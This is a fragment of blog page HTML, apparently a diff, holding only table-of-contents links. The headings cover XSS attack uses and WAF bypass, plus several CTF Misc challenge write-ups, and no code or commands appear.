class="nav-text">会话劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%93%E9%B1%BC"><span class="nav-number">3.3.</span> <span class="nav-text">钓鱼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%A1%B5%E4%B8%8A%E9%A9%AC"><span class="nav-number">3.4.</span> <span class="nav-text">网页上马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOS%E4%B8%8EDDOS"><span class="nav-number">3.5.</span> <span class="nav-text">DOS与DDOS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-%E8%A0%95%E8%99%AB"><span class="nav-number">3.6.</span> <span class="nav-text">XSS 蠕虫</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E7%BB%95%E8%BF%87WAF"><span class="nav-number">4.</span> <span class="nav-text">XSS绕过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">4.1.</span> <span class="nav-text">编码绕过</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UTCTF2020-File-Carving"><span class="nav-number">1.1.</span> <span class="nav-text">[UTCTF2020]File Carving</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.1.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.1.2.</span> <span class="nav-text">解题思路：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#INSHack2017-sanity"><span class="nav-number">1.2.</span> <span class="nav-text">[INSHack2017]sanity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GUET-CTF2019-soul-sipse"><span class="nav-number">1.3.</span> <span class="nav-text">[GUET-CTF2019]soul sipse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.2.</span> <span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-voip"><span class="nav-number">1.4.</span> <span class="nav-text">BUUCTF voip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-Business-Planning-Group"><span class="nav-number">1.5.</span> <span class="nav-text">BUUCTF Business Planning Group</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">解题思路</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
